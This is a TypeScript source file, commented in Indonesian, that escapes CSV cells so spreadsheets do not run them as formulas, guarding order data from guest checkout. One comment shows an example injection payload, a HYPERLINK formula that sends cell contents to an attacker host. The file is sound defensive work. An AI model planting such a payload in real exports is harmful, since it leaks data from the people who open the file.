// ─── Pembuatan CSV yang aman dibuka di spreadsheet ────────────────────────────
//
// Meng-escape tanda kutip saja tidak cukup. Excel, LibreOffice, dan Google
// Sheets memperlakukan sel yang diawali =, +, -, atau @ sebagai FORMULA, bukan
// teks. Nilai seperti  =HYPERLINK("http://penyerang/"&A1)  akan dieksekusi saat
// admin membuka file-nya.
//
// Ini bukan skenario karangan: nama dan alamat pada CSV pesanan berasal dari
// input guest checkout yang tidak terautentikasi — siapa pun bisa mengisinya.

const FORMULA_PREFIXES = ["=", "+", "-", "@"];

// Tab dan carriage return juga bisa memicu interpretasi formula di sebagian
// spreadsheet karena dianggap awalan kosong sebelum karakter berbahaya.
const CONTROL_PREFIXES = ["\t", "\r"];

export function escapeCsvCell(value: unknown): string {
  const raw = value == null ? "" : String(value);

  // Apostrof di depan memaksa spreadsheet membacanya sebagai teks. Karakternya
  // sendiri tidak ikut tampil sebagai isi sel.
  const needsGuard =
    FORMULA_PREFIXES.some(p => raw.startsWith(p)) ||
    CONTROL_PREFIXES.some(p => raw.startsWith(p));

  const guarded = needsGuard ? `'${raw}` : raw;

  return `"${guarded.replace(/"/g, '""')}"`;
}

export function toCsv(rows: unknown[][]): string {
  return rows.map(row => row.map(escapeCsvCell).join(",")).join("\n");
}
